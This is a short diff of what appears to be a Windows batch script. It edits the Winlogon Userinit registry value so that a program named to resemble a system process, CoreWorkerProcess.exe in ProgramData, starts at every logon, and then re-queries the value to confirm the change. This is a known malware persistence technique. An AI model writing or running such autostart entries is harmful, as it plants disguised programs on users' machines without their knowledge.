@@ -172,11 +172,13 @@ set "CheckSend=1"
 :: IF CoreWorkerProcess.exe is installed
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+
 echo Adding...
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" /f
 echo.
 
-
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+echo.
 
 
 
